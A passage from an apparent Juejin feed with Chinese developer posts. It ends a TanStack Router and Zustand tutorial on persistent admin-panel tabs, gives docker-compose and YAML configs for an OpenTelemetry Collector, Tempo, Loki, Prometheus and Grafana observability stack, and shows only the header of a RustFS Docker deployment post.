        <span class="hljs-keyword">const</span> { tabs, activeTab } = <span class="hljs-title function_">get</span>()
        <span class="hljs-keyword">if</span> (tabs.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-comment">// 至少保留一个</span>

        <span class="hljs-comment">// 如果关闭的是当前激活的 Tab，需要计算跳转目标</span>
        <span class="hljs-keyword">if</span> (activeTab === targetPath) {
          <span class="hljs-keyword">const</span> index = tabs.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">fullPath</span> === targetPath)
          <span class="hljs-keyword">const</span> nextTab = tabs[index + <span class="hljs-number">1</span>] || tabs[index - <span class="hljs-number">1</span>]
          <span class="hljs-keyword">if</span> (nextTab) {
            <span class="hljs-title function_">navigate</span>({ <span class="hljs-attr">to</span>: nextTab.<span class="hljs-property">fullPath</span> })
          }
        }

        <span class="hljs-title function_">set</span>({ <span class="hljs-attr">tabs</span>: tabs.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">fullPath</span> !== targetPath) })
      },

      <span class="hljs-attr">clearTabs</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>({ <span class="hljs-attr">tabs</span>: [] })
    }),
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'admin-tabs-session'</span>,
      <span class="hljs-attr">storage</span>: <span class="hljs-title function_">createJSONStorage</span>(<span class="hljs-function">() =&gt;</span> sessionStorage), <span class="hljs-comment">// 使用 SessionStorage</span>
    }
  )
)
</code></pre>
<h3 data-id="heading-6">第三步：连接 Router 与 Store</h3>
<p>这是最关键的一步。我们需要在 Router 确认页面加载完毕 (<code>onResolved</code>) 后，通知 Store。<strong>不要使用 <code>onLoad</code></strong>，因为它会在重定向发生前触发，导致记录脏数据。</p>
<p>建议在你的路由入口文件（如 <code>router.tsx</code> 或 <code>main.tsx</code>）中添加：</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// src/router.tsx</span>
<span class="hljs-keyword">import</span> { createRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'@tanstack/react-router'</span>
<span class="hljs-keyword">import</span> { routeTree } <span class="hljs-keyword">from</span> <span class="hljs-string">'./routeTree.gen'</span>
<span class="hljs-keyword">import</span> { useTabStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'./store/useTabStore'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  routeTree,
  <span class="hljs-attr">defaultPreload</span>: <span class="hljs-string">'intent'</span>,
})

<span class="hljs-comment">// ✨ 核心：订阅路由变化</span>
<span class="hljs-comment">// onResolved 意味着：Loader 执行完毕，重定向已处理，确定要渲染页面了</span>
router.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">'onResolved'</span>, <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> {
  useTabStore.<span class="hljs-title function_">getState</span>().<span class="hljs-title function_">addTab</span>(state)
})
</code></pre>
<h3 data-id="heading-7">第四步：渲染 TabList 组件</h3>
<p>最后，在你的布局文件（<code>__root.tsx</code> 或 <code>Layout.tsx</code>）中渲染这个组件。</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// src/components/LayoutTabs.tsx</span>
<span class="hljs-keyword">import</span> { useTabStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'../store/useTabStore'</span>
<span class="hljs-keyword">import</span> { useNavigate } <span class="hljs-keyword">from</span> <span class="hljs-string">'@tanstack/react-router'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">LayoutTabs</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { tabs, activeTab, removeTab } = <span class="hljs-title function_">useTabStore</span>()
  <span class="hljs-keyword">const</span> navigate = <span class="hljs-title function_">useNavigate</span>()

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex gap-2 border-b border-gray-200 bg-gray-50 px-4 pt-2 overflow-x-auto"</span>&gt;</span>
      {tabs.map((tab) =&gt; {
        const isActive = activeTab === tab.fullPath
        return (
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">key</span>=<span class="hljs-string">{tab.fullPath}</span>
            <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> navigate({ to: tab.fullPath })}
            className={`
              group relative flex items-center gap-2 px-4 py-2 text-sm cursor-pointer rounded-t-md transition-colors border-t border-x border-transparent
              ${isActive 
                ? 'bg-white text-blue-600 border-gray-200 font-medium' 
                : 'text-gray-500 hover:text-gray-700 hover:bg-gray-100'
              }
            `}
          &gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{tab.title}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            
            {/* 关闭按钮：仅在 Hover 或 激活时显示，或总是显示 */}
            {tab.closable &amp;&amp; (
              <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">ml-1</span> <span class="hljs-attr">rounded-full</span> <span class="hljs-attr">p-0.5</span> <span class="hljs-attr">hover:bg-gray-200</span> ${!<span class="hljs-attr">isActive</span> ? '<span class="hljs-attr">opacity-0</span> <span class="hljs-attr">group-hover:opacity-100</span>' <span class="hljs-attr">:</span> ''}`}
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{(e)</span> =&gt;</span> {
                  e.stopPropagation() // 阻止冒泡，避免触发 Tab 跳转
                  removeTab(tab.fullPath, navigate)
                }}
              &gt;
                ✕
              <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            )}
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        )
      })}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h2 data-id="heading-8">4. 总结与优化建议</h2>
<p>通过这套方案，我们成功解决了一开始提出的所有痛点：</p>
<ol>
<li><strong>去重</strong>：<code>useTabStore</code> 中的逻辑保证了同一个 URL 不会被重复添加。</li>
<li><strong>准确性</strong>：<code>onResolved</code> 保证了只有有效页面才会被记录。</li>
<li><strong>持久化</strong>：刷新页面 Tabs 不丢失。</li>
<li><strong>解耦</strong>：Router 负责导航，Zustand 负责状态，UI 负责渲染，各司其职。</li>
</ol>
<p><strong>进阶小贴士：</strong></p>
<ul>
<li><strong>右键菜单</strong>：可以给 Tab 添加右键菜单，实现“关闭其他”、“关闭右侧”等功能（只需在 Store 中添加对应 <code>filter</code> 逻辑即可）。</li>
<li><strong>参数敏感性</strong>：目前的逻辑是 <code>fullPath</code>（包含 Query 参数）敏感的。如果不希望 <code>?page=1</code> 和 <code>?page=2</code> 分成两个 Tab，可以在 <code>addTab</code> 中改用 <code>location.pathname</code> 作为 Key。</li>
</ul>
<p>希望这篇实战指南能帮助你在 TanStack Router 中构建出丝滑的后台交互体验！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[otel-collector全家桶]]></title>    <link>https://juejin.cn/post/7592992745573220390</link>    <guid>https://juejin.cn/post/7592992745573220390</guid>    <pubDate>2026-01-09T03:31:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592992745573220390" data-draft-id="7592996072704933938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="otel-collector全家桶"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-09T03:31:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ChildrenGreens"/> <meta itemprop="url" content="https://juejin.cn/user/3672804335299773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            otel-collector全家桶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3672804335299773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ChildrenGreens
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:31:58.000Z" title="Fri Jan 09 2026 03:31:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>docker-compose.yml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.9"</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-attr">tempo:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">grafana/tempo:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">tempo</span>
    <span class="hljs-attr">command:</span> [<span class="hljs-string">"-config.file=/etc/tempo/tempo.yaml"</span>]
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./tempo.yaml:/etc/tempo/tempo.yaml:ro</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"3200:3200"</span>    <span class="hljs-comment"># Grafana 访问 Tempo HTTP</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"4317:4317"</span>    <span class="hljs-comment"># OTLP gRPC（给外部用可选，但留着也没坏处）</span>

  <span class="hljs-attr">otel-collector:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">otel/opentelemetry-collector:0.140.1</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">otel-collector</span>
    <span class="hljs-attr">command:</span> [<span class="hljs-string">"--config=/etc/otelcol/config.yaml"</span>]
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./otel-collector.yaml:/etc/otelcol/config.yaml:ro</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"4318:4318"</span>    <span class="hljs-comment"># Spring Boot OTLP HTTP</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9464:9464"</span>    <span class="hljs-comment"># Prometheus scrape</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"13133:13133"</span>  <span class="hljs-comment"># 健康检查（可选）</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">tempo</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">loki</span>

  <span class="hljs-attr">loki:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">grafana/loki:2.9.0</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">loki</span>
    <span class="hljs-attr">user:</span> <span class="hljs-string">"0"</span>   <span class="hljs-comment"># 👈 关键：以 root 用户运行，避免权限问题</span>
    <span class="hljs-attr">command:</span> [<span class="hljs-string">"-config.file=/etc/loki/loki-config.yaml"</span>]
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./loki-config.yaml:/etc/loki/loki-config.yaml:ro</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">loki-data:/loki</span>          <span class="hljs-comment"># 👈 新增：宿主机目录挂到 /loki</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"3100:3100"</span>

  <span class="hljs-attr">prometheus:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/prometheus:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">prometheus</span>
    <span class="hljs-attr">command:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"--config.file=/etc/prometheus/prometheus.yml"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./prometheus.yml:/etc/prometheus/prometheus.yml:ro</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"9090:9090"</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">otel-collector</span>

  <span class="hljs-attr">grafana:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">grafana/grafana:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">grafana</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"3000:3000"</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">prometheus</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">tempo</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">loki</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">loki-data:</span> {}

</code></pre>
<p>tempo.yaml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">http_listen_port:</span> <span class="hljs-number">3200</span>
  <span class="hljs-attr">grpc_listen_port:</span> <span class="hljs-number">9095</span>        <span class="hljs-comment"># Tempo 内部 gRPC，用默认端口</span>

<span class="hljs-attr">distributor:</span>
  <span class="hljs-attr">receivers:</span>
    <span class="hljs-attr">otlp:</span>
      <span class="hljs-attr">protocols:</span>
        <span class="hljs-attr">grpc:</span>
          <span class="hljs-attr">endpoint:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:4317</span>   <span class="hljs-comment"># ⭐ OTLP gRPC 在容器内监听 4317</span>

<span class="hljs-attr">storage:</span>
  <span class="hljs-attr">trace:</span>
    <span class="hljs-attr">backend:</span> <span class="hljs-string">local</span>
    <span class="hljs-attr">wal:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/tempo/wal</span>
    <span class="hljs-attr">local:</span>
      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/tempo/blocks</span>

<span class="hljs-attr">compactor:</span>
  <span class="hljs-attr">compaction:</span>
    <span class="hljs-attr">compaction_window:</span> <span class="hljs-string">1h</span>
    <span class="hljs-attr">block_retention:</span> <span class="hljs-string">24h</span>
    <span class="hljs-attr">compacted_block_retention:</span> <span class="hljs-string">24h</span>
</code></pre>
<p>loki-config.yaml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">auth_enabled:</span> <span class="hljs-literal">false</span>

<span class="hljs-attr">server:</span>
  <span class="hljs-attr">http_listen_port:</span> <span class="hljs-number">3100</span>
  <span class="hljs-attr">grpc_listen_port:</span> <span class="hljs-number">9096</span>

<span class="hljs-attr">ingester:</span>
  <span class="hljs-attr">wal:</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">dir:</span> <span class="hljs-string">/loki/wal</span>          <span class="hljs-comment"># 👈 WAL 放在 /loki 下面，挂了 volume 就不会权限问题</span>
  <span class="hljs-attr">lifecycler:</span>
    <span class="hljs-attr">address:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">ring:</span>
      <span class="hljs-attr">kvstore:</span>
        <span class="hljs-attr">store:</span> <span class="hljs-string">inmemory</span>
      <span class="hljs-attr">replication_factor:</span> <span class="hljs-number">1</span>
    <span class="hljs-attr">final_sleep:</span> <span class="hljs-string">0s</span>
  <span class="hljs-attr">chunk_idle_period:</span> <span class="hljs-string">3m</span>
  <span class="hljs-attr">max_chunk_age:</span> <span class="hljs-string">1h</span>
  <span class="hljs-attr">chunk_target_size:</span> <span class="hljs-number">1048576</span>
  <span class="hljs-attr">max_transfer_retries:</span> <span class="hljs-number">0</span>

<span class="hljs-attr">schema_config:</span>
  <span class="hljs-attr">configs:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">from:</span> <span class="hljs-number">2020-10-24</span>
      <span class="hljs-attr">store:</span> <span class="hljs-string">boltdb-shipper</span>
      <span class="hljs-attr">object_store:</span> <span class="hljs-string">filesystem</span>
      <span class="hljs-attr">schema:</span> <span class="hljs-string">v11</span>
      <span class="hljs-attr">index:</span>
        <span class="hljs-attr">prefix:</span> <span class="hljs-string">index_</span>
        <span class="hljs-attr">period:</span> <span class="hljs-string">24h</span>

<span class="hljs-attr">storage_config:</span>
  <span class="hljs-attr">boltdb_shipper:</span>
    <span class="hljs-attr">active_index_directory:</span> <span class="hljs-string">/loki/index</span>
    <span class="hljs-attr">cache_location:</span> <span class="hljs-string">/loki/cache</span>
    <span class="hljs-attr">shared_store:</span> <span class="hljs-string">filesystem</span>
  <span class="hljs-attr">filesystem:</span>
    <span class="hljs-attr">directory:</span> <span class="hljs-string">/loki/chunks</span>     <span class="hljs-comment"># 👈 数据块目录，同样在 /loki 下面</span>

<span class="hljs-attr">compactor:</span>
  <span class="hljs-attr">working_directory:</span> <span class="hljs-string">/loki/compactor</span>
  <span class="hljs-attr">shared_store:</span> <span class="hljs-string">filesystem</span>
  <span class="hljs-attr">compaction_interval:</span> <span class="hljs-string">10m</span>

<span class="hljs-attr">limits_config:</span>
  <span class="hljs-attr">allow_structured_metadata:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">enforce_metric_name:</span> <span class="hljs-literal">false</span>
  <span class="hljs-attr">reject_old_samples:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">reject_old_samples_max_age:</span> <span class="hljs-string">168h</span>
  <span class="hljs-attr">max_streams_per_user:</span> <span class="hljs-number">0</span>
  <span class="hljs-attr">max_global_streams_per_user:</span> <span class="hljs-number">0</span>

<span class="hljs-attr">query_range:</span>
  <span class="hljs-attr">parallelise_shardable_queries:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">align_queries_with_step:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">cache_results:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">max_retries:</span> <span class="hljs-number">5</span>

<span class="hljs-attr">querier:</span>
  <span class="hljs-attr">engine:</span>
    <span class="hljs-attr">max_look_back_period:</span> <span class="hljs-string">0s</span>
  <span class="hljs-attr">query_timeout:</span> <span class="hljs-string">1m</span>

</code></pre>
<p>otel-collector.yaml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">receivers:</span>
  <span class="hljs-attr">otlp:</span>
    <span class="hljs-attr">protocols:</span>
      <span class="hljs-attr">http:</span>
        <span class="hljs-attr">endpoint:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:4318</span>   <span class="hljs-comment"># HTTP OTLP，给 Spring Boot 用</span>
      <span class="hljs-attr">grpc:</span>
        <span class="hljs-attr">endpoint:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:4317</span>   <span class="hljs-comment"># gRPC OTLP（可选）</span>

<span class="hljs-attr">exporters:</span>
  <span class="hljs-attr">prometheus:</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"0.0.0.0:9464"</span>
    <span class="hljs-attr">namespace:</span> <span class="hljs-string">"myapp"</span>

  <span class="hljs-attr">otlp/tempo:</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"tempo:4317"</span>      <span class="hljs-comment"># ⭐ 发 gRPC 到 Tempo</span>
    <span class="hljs-attr">tls:</span>
      <span class="hljs-attr">insecure:</span> <span class="hljs-literal">true</span>

  <span class="hljs-attr">otlphttp/logs:</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://loki:3100/otlp"</span>
    <span class="hljs-attr">tls:</span>
      <span class="hljs-attr">insecure:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">processors:</span>
  <span class="hljs-attr">batch:</span>
    <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>
    <span class="hljs-attr">send_batch_size:</span> <span class="hljs-number">1000</span>

<span class="hljs-attr">service:</span>
  <span class="hljs-attr">pipelines:</span>
    <span class="hljs-attr">metrics:</span>
      <span class="hljs-attr">receivers:</span> [<span class="hljs-string">otlp</span>]
      <span class="hljs-attr">processors:</span> [<span class="hljs-string">batch</span>]
      <span class="hljs-attr">exporters:</span> [<span class="hljs-string">prometheus</span>]

    <span class="hljs-attr">traces:</span>
      <span class="hljs-attr">receivers:</span> [<span class="hljs-string">otlp</span>]
      <span class="hljs-attr">processors:</span> [<span class="hljs-string">batch</span>]
      <span class="hljs-attr">exporters:</span> [<span class="hljs-string">otlp/tempo</span>]

    <span class="hljs-attr">logs:</span>
      <span class="hljs-attr">receivers:</span> [<span class="hljs-string">otlp</span>]
      <span class="hljs-attr">processors:</span> [<span class="hljs-string">batch</span>]
      <span class="hljs-attr">exporters:</span> [<span class="hljs-string">otlphttp/logs</span>]

</code></pre>
<p>prometheus.yml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">global:</span>
  <span class="hljs-attr">scrape_interval:</span> <span class="hljs-string">10s</span>

<span class="hljs-attr">scrape_configs:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">job_name:</span> <span class="hljs-string">'otel-collector'</span>
    <span class="hljs-attr">static_configs:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">targets:</span> [<span class="hljs-string">'otel-collector:9464'</span>]

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[手把手教你用Docker部署RustFS：3步搭建S3兼容存储（CentOS／Ubuntu通用，附避坑指南）]]></title>    <link>https://juejin.cn/post/7592846242176974882</link>    <guid>https://juejin.cn/post/7592846242176974882</guid>    <pubDate>2026-01-09T04:29:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592846242176974882" data-draft-id="7592853243732115496" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="手把手教你用Docker部署RustFS：3步搭建S3兼容存储（CentOS／Ubuntu通用，附避坑指南）"/> <!----> <meta itemprop="datePublished" content="2026-01-09T04:29:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="对象存储与RustFS"/> <meta itemprop="url" content="https://juejin.cn/user/652466093570057"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            手把手教你用Docker部署RustFS：3步搭建S3兼容存储（CentOS／Ubuntu通用，附避坑指南）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/652466093570057/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    对象存储与RustFS
